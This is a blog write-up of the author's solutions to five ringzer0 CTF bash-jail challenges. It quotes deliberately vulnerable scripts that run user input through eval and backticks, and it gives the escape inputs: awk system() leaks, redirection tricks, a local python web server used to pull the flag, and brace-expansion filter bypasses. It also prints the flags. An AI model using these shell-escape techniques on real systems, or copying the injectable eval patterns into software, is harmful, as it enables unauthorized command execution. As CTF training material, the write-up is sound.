+++
title = "ringzer0 CTF - Jail Escaping Bash"
author = "Victor Dorneanu"
date = "2016-06-20"
tags = ["ringzer0", "ctf", "wargames", "bash "]
category = "blog"
+++

Here are my solutions for the [ringzer0](https://ringzer0team.com) **Jail Escaping** shell challenges.

# Level1

```.shell
evel1@ringzer0team.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

while :
do
        echo "Your input:"
        read input
        output=`$input`
done 

-----------------------------
```

You can spawn a shell using:

```
/bin/bash
```

Although you **can't read** (you could redirect *stdout* to *stderr*) files, you can try to **run** commands based on the file content:

```.shell
level1@lxc17-bash-jail:~$ awk '{system("wc "$1)}' /home/level1/flag.txt 
wc: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: No such file or directory
```

# Level 2

```.shell
level2@ringzer0team.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge bash code:
-----------------------------

function check_space {
        if [[ $1 == *[bdks';''&'' ']* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input" 
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output="echo Your command is: $input"
                eval $output
        fi
done 

-----------------------------
Your input:
```

Since you are not allowed to use certain characters like ";", "&", "]", "b", "d" and so on, you must think of some way to read 
content of `/home/level2/flag.txt`. In my case the following worked:

```.shell
`</home/level2/flag.txt`
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
Your input:
```

# Level 3

```.shell
level3@ringzer0team.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksc]* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input" 
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output=`$input` &>/dev/null
                echo "Command executed"
        fi
done 

-----------------------------
Your input:

```

The problem here is that **stderr** is being redirected to `/dev/null`:

```
WARNING: this prompt is launched using ./prompt.sh 2>/dev/null
```

The 2nd problem is that **stdout** *and* **stderr** are also redirected to `/dev/null`:

```
output=`$input` &>/dev/null
```

But fortunately we are allowed to use `eval` (which doesn't match against the regexp in `check_space`). If I'd execute:

```.shell
eval $(</home/level3/flag.txt)
```

this would cause an error since the shell cannot execute the command associated with the content in the flag file. But since **stderr** is redirected I had to redirect again to sth else, like **stdin** (0):

```.shell
Your input:
eval $(</home/level3/flag.txt) 2>&0
./real.sh: line 39: FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j: command not found
Command executed
```


# Level 4

```.shell
level4@ringzer0team.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksc'/''<''>''&''$']* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input" 
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output=`$input < /dev/null` &>/dev/null
                echo "Command executed"
        fi
done 

-----------------------------
Your input:
```

Since a lot of characters are not allowed, stdout/stderr redirection is not working anymore. And regarding `< /dev/null`: This is mostly used to [detach a process from a tty](http://stackoverflow.com/questions/19955260/what-is-dev-null-in-bash). That means we are allowed to launch some daemons. After some try & failure I thought of starting some web server and then "downloading" the flag file using a GET request. At that point I had 2 problems:

* start a server
* **somehow** GET the flag.txt file

Starting a web server was easy:

```
Your input:
python -m SimpleHTTPServer
``` 

Now I had to download the file using `http://127.0.0.1:8000`. Then I've realized that for **level1** I had a `bash` I could use to download the file:

```
level1@lxc17-bash-jail:~$ netstat -tan 1>&0
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0    316 10.0.3.26:22            195.178.101.66:35930    ESTABLISHED
tcp        0      0 10.0.3.26:22            195.178.101.66:13279    ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
```

As you can see the web server is running on port `8000`. Since `wget`, `curl` or other HTTP clients were not available, I had to run python again in order to get the file:

```
level1@lxc17-bash-jail:~$ python3 1>&0
Python 3.4.3 (default, Oct 14 2015, 20:28:29) 
[GCC 4.8.4] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.request
>>> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F\n'
>>> quConnection to ringzer0team.com closed.
```

# Level 5

The last one was indeed **very difficult**. But before going into details, let's have a look at the prompt:

```.shell
RingZer0 Team Online CTF

BASH Jail Level 5:
Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)

Flag is located at /home/level5/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksctr'?''*''/''<''>''&''$']* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input" 
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output=`$input < /dev/null` &>/dev/null
                echo "Command executed"
        fi
done 

-----------------------------
Your input:

```

So obvisouly a lot of characters are not allowed to be used. This makes the challenge very hard since also redirects (>,<,&) are not possible anymore. So even one has succeeded in reading the file, the OUTPUT has to be redirected to some other device. But the slash (/) is also not allowed, making it hard to specify the output (e.g. /dev/shm/buffer). 

Having that in mind I've tried several things:

## Vim

The idea was to start vim, **read** the flag.txt and write the buffer to sth like `/dev/shm/buffervim`. But vim has some problems starting when STDIN=`/dev/null`. At the beginning I saw `vim` starting but then it disapeared suddenly. It took me a file to find out that starting vim with STDIN != some tty would be tricky. 

## Create another file

Since I was able to read the file easily:

```.shell
$ uniq flag.[a-z][a-z][a-z]
```

... I thought I could create a new file inside `/home/level5/` by using `uniq`:

```.shell
$ uniq flag.[a-z][a-z][a-z] new_file
```

That didn't work and it took some some while to understand **why**. Using `lsattr` I've checked the attributes on `/home/level5`:


```.shell
level1@lxc17-bash-jail:/home/level5$ lsattr -a>&0
----i--------e-- ./.
----i--------e-- ./..
----i--------e-- ./real.sh
lsattr: Permission denied While reading flags on ./flag.txt
----i--------e-- ./prompt.sh
----i--------e-- ./.bash_logout
----i--------e-- ./.bashrc
----i--------e-- ./.profile
level1@lxc17-bash-jail:/home/level5$ 

``` 

As you can see `/home/level5` is set to **immutable** (i) which means that I can't modify files in that directory or create new ones. 

## Use bash magic voodoo

Desperately searching for some solution, I've asked [maxenced](https://ringzer0team.com/profile/8593/maxenced) (who was the last one having solved this level)  for some additional hint. BTW: I've "bought" the hint for this hint very early, but it didn't help a lot. Anyway... He told me I should use **bash brace expansions**. 
Okay, so let's have a look and see what we can do using them:

```.shell
$ echo {a..z}
a b c d e f g h i j k l m n o p q r s t u v w x y z

$ echo {1..10..2}
1 3 5 7 9

$ echo {o..u}ython
oython python qython rython sython tython uython
``` 

So obvisouly we can **bypass** the restricted characters by simpling iterating through a range of 
characters. Now the next step was to find a way how to **expand shell commands** (and this was the
most imporant part - thx again [maxenced](https://ringzer0team.com/profile/8593/maxenced)). I've tried sth 
like:

```.shell
$ eval {o..u}ython
bash: oython: command not found
```
`eval` was **not** expanding the commands. Then I've tried sth different:

```.shell
$ `echo echo {o..u}ython\\;`
oython; python; qython; rython; sython; tython; uython;
```

Now let me explain the changes:

* I've added backticks to run the commands
* I've added **\\;** at the end which simply adds a semicolon (;) at the end of each expansion

If I change the `echo` to `eval`, then `eval` will basically run:

```.shell
oython; python; qython; rython; sython; tython; uython;
```

Afterwards I've found out that `python` refused to start if STDIN = `/dev/null` (the same as with `vim`). Then
I remembered the solution in a previous level where I've start a **HTTP server** (using `python`) to "download" 
the flag.txt. So all I wanted to run was:

```.shell
$ python -m SimpleHTTPServer
```

As you may have noticed "SimpleHTTPServer" contains restricted characters like **r**. So we'll have to use *brace expansion* again:

```.shell
$ `echo echo {u..o}ython\ -m\ SimpleHTTPSe{u..o}ve{o..u}\\;`
...
```

The next step was to properly escape the backslashes to make sure that eval is executing the right thing. So the final payload was:

```.shell
$ eval eval py{o..u}hon\\ -m\\ SimpleHTTPSe{q..v}ve{q..v}\\; 
```

I would also want to thank David, Ralph and Tobias for their awesome ideas and the great hacking session we had on Friday :)


